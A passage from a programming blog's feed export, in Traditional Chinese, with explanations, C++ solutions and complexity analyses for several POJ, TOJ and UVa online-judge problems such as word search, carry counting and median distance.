class="number">0</span>;</span><br><span class="line">		from[i]=<span class="number">-1</span>;</span><br><span class="line">		vis[i]=<span class="literal">false</span>;</span><br><span class="line">		nxt[i].clear();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">		init();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,x,y ; i&lt;n<span class="number">-1</span> ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">			P[y][<span class="number">0</span>]=x;</span><br><span class="line">			from[y]=x;</span><br><span class="line">			nxt[x].push_back(y);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(from[i]==<span class="number">-1</span>)&#123;</span><br><span class="line">				root=i;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		computeP();</span><br><span class="line">		computeD(root,<span class="number">0</span>);</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;l&gt;&gt;r;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;LCA(l,r)&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>預處理時間複雜度 $O(NlogN + N)$<br>每筆詢問時間複雜度 $O(NlogN)$</p>
]]></content>
      <categories>
        <category>POJ</category>
      </categories>
      <tags>
        <tag>POJ</tag>
        <tag>LCA</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 98</title>
    <url>/2021/03/23/TOJ98/</url>
    <content><![CDATA[<h1 id="TOJ-98"><a href="#TOJ-98" class="headerlink" title="TOJ 98"></a>TOJ 98</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/98/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/98/</a></p>
<p>輸出 光秒, 光分, 光時, 光日, 光週, 光年 在公尺的單位下的數值</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> LS;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> LM;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> LH;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> LD;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> LW;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> LY;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> L=<span class="number">299792458</span>;<span class="comment">//m/s</span></span><br><span class="line">    </span><br><span class="line">    LS=L;</span><br><span class="line">    LM=L*<span class="number">60</span>;</span><br><span class="line">    LH=L*<span class="number">60</span>*<span class="number">60</span>;</span><br><span class="line">    LD=L*<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>;</span><br><span class="line">    LW=L*<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>;</span><br><span class="line">    LY=L*<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">365</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"1 Light-second(LS) is "</span>&lt;&lt;LS&lt;&lt;<span class="string">" metres."</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"1 Light-minute(LM) is "</span>&lt;&lt;LM&lt;&lt;<span class="string">" metres."</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"1 Light-hour(LH) is "</span>&lt;&lt;LH&lt;&lt;<span class="string">" metres."</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"1 Light-day(LD) is "</span>&lt;&lt;LD&lt;&lt;<span class="string">" metres."</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"1 Light-week(LW) is "</span>&lt;&lt;LW&lt;&lt;<span class="string">" metres."</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"1 Light-year(LY) is "</span>&lt;&lt;LY&lt;&lt;<span class="string">" metres."</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度約為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10010</title>
    <url>/2021/03/23/UVa10010/</url>
    <content><![CDATA[<h1 id="UVa-10010"><a href="#UVa-10010" class="headerlink" title="UVa 10010"></a>UVa 10010</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10010" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10010</a></p>
<p>給一個 $m \times n$ 的圖，每個格子上都有一個字</p>
<p>接下來會有 $k$ 個字串，要問這個字串在圖中的位置，並且保證一定存在</p>
<p>我們在圖中尋找的方向有8個 : 往左、往右、往上、往下、往左上、往左下、往右上、往右下</p>
<p>並且請忽視大小寫</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於每個點，如果和詢問的第一個字相同，就以它為起點向8個方向找，如果找到答案就直接輸出</p>
<p>用 dir 陣列儲存八個方位的 $x, y$ 座標變化量</p>
<p>並且用 cango 判斷是否還在圖的範圍內</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,m,n,k,dir[<span class="number">8</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">char</span> arr[<span class="number">55</span>][<span class="number">55</span>];</span><br><span class="line"><span class="built_in">string</span> query;</span><br><span class="line"><span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cango</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 判斷是否超出範圍</span></span><br><span class="line">    <span class="keyword">if</span>(x&lt;<span class="number">0</span> || x&gt;=m || y&lt;<span class="number">0</span> || y&gt;=n) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">find_ans</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 向8個方向找答案，並回傳是否找到答案</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">8</span> ; i++)&#123;</span><br><span class="line">        <span class="keyword">bool</span> end=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> step=<span class="number">0</span> ; step&lt;len ; step++)&#123;</span><br><span class="line">            <span class="keyword">int</span> nx=x+dir[i][<span class="number">0</span>]*step;</span><br><span class="line">            <span class="keyword">int</span> ny=y+dir[i][<span class="number">1</span>]*step;</span><br><span class="line">            <span class="keyword">if</span>(!cango(nx,ny) || arr[nx][ny]!=query[step])&#123;</span><br><span class="line">                <span class="comment">// 不能走，或是不匹配則必定非為答案</span></span><br><span class="line">                end=<span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(end) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(out)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            out=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ; j++)&#123;</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">                arr[i][j]=<span class="built_in">tolower</span>(arr[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">        <span class="keyword">while</span>(k--)&#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;query;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;query.size() ; i++)&#123;</span><br><span class="line">                query[i]=<span class="built_in">tolower</span>(query[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">bool</span> end=<span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">int</span> ans_x=<span class="number">-1</span>,ans_y=<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n &amp;&amp; !end ; j++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(arr[i][j]==query[<span class="number">0</span>] &amp;&amp; find_ans(i,j,query.size()))&#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;j+<span class="number">1</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">                        end=<span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>輸入時間複雜度為 $O(mn)$</p>
<p>對於8個方位的查詢，時間複雜度可以估計為 $O(1)$</p>
<p>則查詢的時間複雜度約為 $O(mn)$</p>
<p>總時間複雜度為 $O(tmn)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10082</title>
    <url>/2021/03/23/UVa10082/</url>
    <content><![CDATA[<h1 id="UVa-10082"><a href="#UVa-10082" class="headerlink" title="UVa 10082"></a>UVa 10082</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10082" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10082</a></p>
<p>人在打字常常打錯，現在給你一項任務，將所有輸入的字元都變成在鍵盤中左邊一位的字元</p>
<p>當然，題目保證不會輸入像是 <strong>Q</strong> <strong>A</strong> <strong>Z</strong> <strong>`</strong> 的邊界字元，請放心</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>直接將鍵盤上的字刷過一遍，沒錯，刷過去</p>
<p>建立一個字串 $tbl$ ，包含鍵盤上的所有字母，並且是由上到下、由左到右的順序</p>
<p>接下來每次我們輸入的時候，只需要到 $tbl$ 找到當前的字母，然後輸出他的前一個就可以了</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> tbl=<span class="string">"`1234567890-=QWERTYUIOP[]ASDFGHJKL;'ZXCVBNM,./'"</span>;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(getline(<span class="built_in">cin</span>,s))&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i]==<span class="string">' '</span>)</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;tbl.size() ; j++)&#123;</span><br><span class="line">					<span class="keyword">if</span>(s[i]==tbl[j])&#123;</span><br><span class="line">						<span class="built_in">cout</span>&lt;&lt;tbl[j<span class="number">-1</span>];</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>假設 $tbl$ 的字串長度為 $N$</p>
<p>每次查詢時間複雜度最差為 $O(N)$</p>
<p>每筆測資時間複雜度為 $O(len(s)N)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa10035</title>
    <url>/2020/07/02/UVa10035/</url>
    <content><![CDATA[<h1 id="UVa10035"><a href="#UVa10035" class="headerlink" title="UVa10035"></a>UVa10035</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10035" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10035</a><br>給兩個十位數，求相加過程中進位幾次</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>直接模擬一遍加法的作法<br>從最低位開始相加，如果有進位記錄進位多少，再將答案遞增即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> a,b;</span><br><span class="line"><span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> A=a.size()<span class="number">-1</span>,B=b.size()<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">int</span> carry=<span class="number">0</span>,num_A,num_B;</span><br><span class="line">	<span class="keyword">while</span>(A&gt;=<span class="number">0</span> || B&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">		num_A=(A&lt;<span class="number">0</span>) ? <span class="number">0</span> : a[A]-<span class="string">'0'</span>;</span><br><span class="line">		num_B=(B&lt;<span class="number">0</span>) ? <span class="number">0</span> : b[B]-<span class="string">'0'</span>;</span><br><span class="line">		<span class="keyword">if</span>(num_A+num_B+carry&gt;<span class="number">9</span>)&#123;</span><br><span class="line">			carry=(num_A+num_B+carry)/<span class="number">10</span>;</span><br><span class="line">			cnt++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			carry=<span class="number">0</span>;</span><br><span class="line">		A--,B--;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b &amp;&amp; (a!=<span class="string">"0"</span> || b!=<span class="string">"0"</span>))&#123;</span><br><span class="line">		cnt=<span class="number">0</span>;</span><br><span class="line">		solve();</span><br><span class="line">		<span class="keyword">if</span>(cnt&gt;<span class="number">1</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;cnt&lt;&lt;<span class="string">" carry operations.\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cnt==<span class="number">1</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"1 carry operation.\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"No carry operation.\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>對每個位數做處理，每個位數處理時間複雜度為 $O(1)$<br>總時間複雜度為 $O(max(len(A),len(B)))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>string</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10041</title>
    <url>/2021/03/25/UVa10041/</url>
    <content><![CDATA[<h1 id="UVa-10041"><a href="#UVa-10041" class="headerlink" title="UVa 10041"></a>UVa 10041</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10041" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10041</a></p>
<p>有一個人要搬家到某條路上，在這條路上有許多他的親戚，他希望新家能距離所有親戚最近</p>
<p>給每個親戚家所在的座標，問這新房子到其他親戚家距離總和是多少</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>首先我們要找到新家的位置，既然要距離所有親戚最近，那就是最中間的位置了(中位數)</p>
<p>要計算中位數，就必須先找到中間項，那麼就先將序列排序吧!如此一來就可以很快找到中間項</p>
<p>找到了新家的座標之後，接下來就計算到每個親戚家的距離總和即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, mid, ans, arr[<span class="number">505</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		sort(arr, arr+m);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 先找中間項</span></span><br><span class="line">		<span class="keyword">if</span>(m%<span class="number">2</span> == <span class="number">0</span>) mid = (arr[m/<span class="number">2</span>] + arr[m/<span class="number">2</span><span class="number">-1</span>])/<span class="number">2</span>;</span><br><span class="line">		<span class="keyword">else</span> mid = arr[m/<span class="number">2</span>];</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 計算距離總和</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">			ans += <span class="built_in">abs</span>(mid - arr[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資輸入時間複雜度為 $O(m)$</p>
<p>每筆測資排序時間複雜度為 $O(mlogm)$</p>
<p>每筆測資計算距離總和時間複雜度為 $O(m)$</p>
<p>每筆測資總時間複雜度約為 $O(2m + mlogm)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10110</title>
    <url>/2021/04/01/UVa10110/</url>
    <content><![CDATA[<h1 id="UVa-10110"><a href="#UVa-10110" class="headerlink" title="UVa 10110"></a>UVa 10110</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10110" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10110</a></p>
<p>在一條走廊上有編號 $1$~$n$ 的電燈泡</p>
<p>有個人在這條走廊上來回走 $n$ 趟，第 $i$ 次出發會將編號為 $i$ 的倍數的電燈泡開關轉換一次(也就是 <code>開 -&gt; 關</code> <code>關 -&gt; 開</code>)，而在走回來不會做任何事</p>
<p>請問來回走完 $n$ 趟之後，第 $n$ 顆電燈泡是亮的還是暗的? (一開始所有電燈泡都是關的)</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>如果第 $n$ 個電燈泡是關的，那麼他一定被操作了 $2k$ 次 ($k \in \mathscr{R}$)</p>
<p>反過來說，如果第 $n$ 個電燈泡是開的，那麼他一定被操作了 $2k-1$ 次 ($k \in \mathscr{R}$)</p>
<p>那何時電燈泡會被操作呢?</p>
<p>只有在他的因數出現的時候會被操作到</p>
<p>那麼如果某數字有奇數個因數，則最後會是開的，反之是關的</p>
<p>任何數字 $p$ 的因數 $q$ 都會有相對應的數字 $r$ 使得 $p = qr$，並且 $r$ 也是 $p$ 的因數</p>
<p>如果說因數是奇數，那就表示最中間的因數 $q$ 找到相對應的數字也是 $q$，使得 $p = q*q$</p>
<p>發現到，當因數個數為奇數，也就是 $p$ 是<strong>完全平方數</strong>的時候第 $n$ 個燈泡會是亮的，反之是暗的</p>
<p>那麼，我們只需要做開根號的動作，去看看開根號後的值平方以及原本的數字是否相同即可</p>
<p>不過這裡要練習二分搜，所以就二分搜開根號吧</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n, tmp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> l, <span class="keyword">long</span> <span class="keyword">long</span> r, <span class="keyword">long</span> <span class="keyword">long</span> p)</span></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> mid, res;</span><br><span class="line">	<span class="keyword">while</span>(l!=r)&#123;</span><br><span class="line">		mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">		res = mid*mid;</span><br><span class="line">		<span class="keyword">if</span>(res == p)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"yes\n"</span>;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(res &lt; p) l = mid+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> r = mid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"no\n"</span>;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		search(<span class="number">0</span>, n+<span class="number">1</span>, n);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資輸入時間複雜度為 $O(1)$</p>
<p>每筆測資找到答案的時間複雜度為 $O(logn)$</p>
<p>每筆測資總時間複雜度為 $O(logn)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>Binary Search</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa10102</title>
    <url>/2020/06/17/UVa10102/</url>
    <content><![CDATA[<h1 id="UVa10102"><a href="#UVa10102" class="headerlink" title="UVa10102"></a>UVa10102</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>針對每個起點(1)做BFS，找到最近的3得到距離，再從其中找最大值</p>
